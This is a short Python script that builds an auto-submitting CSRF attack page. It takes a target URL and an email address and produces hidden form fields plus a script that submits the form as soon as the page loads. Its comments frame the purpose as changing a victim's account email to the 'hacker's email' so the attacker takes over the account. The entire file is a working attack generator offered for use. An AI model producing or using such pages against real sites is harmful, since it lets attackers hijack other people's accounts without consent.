#!/usr/bin/env python3

def generate_csrf(target_url, method="POST", params={}):
    """
    Generating html code using template. 
    """
    html = f"""<html>
    <body>
    <form action="{target_url}" method="{method}">"""
    
    for key, value in params.items():
        html += f'\n        <input type="hidden" name="{key}" value="{value}">'
    
    html += """
    </form>
        <script>document.forms[0].submit();</script>
    </body>
</html>"""
    return html

def main():
    """
    Taking from user 2 input's. 
    1st - target url which vulnerable CSRF.
    2nd - hacker's email which will be used for change from user to hacker.
    """
    target_url = input("Enter url(example: https://targeturl.com/change_email)\n> ")
    email = input("Enter the email you want to change to\n> ")
    
    csrf_html = generate_csrf(target_url, "POST", {"email": email})
    print("\nGenerated, good Luck!\n\n")
    print(csrf_html)

main()
